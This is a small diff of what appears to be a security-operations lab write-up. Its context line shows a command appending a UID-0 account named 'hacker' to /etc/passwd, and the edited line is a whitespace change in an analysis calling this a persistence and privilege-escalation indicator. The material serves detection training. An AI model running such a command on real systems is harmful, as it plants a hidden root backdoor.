@@ -25,7 +25,7 @@ echo 'hacker:x:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
 
 ### Analysis (SOC)
 
-> Direct modification of a critical system file → strong indicator of persistence and potential privilege escalation.
+>Direct modification of a critical system file → strong indicator of persistence and potential privilege escalation.
 
 ### Screenshot
 <img src="images/01-passwd-backdoor-created.png" width="100%">
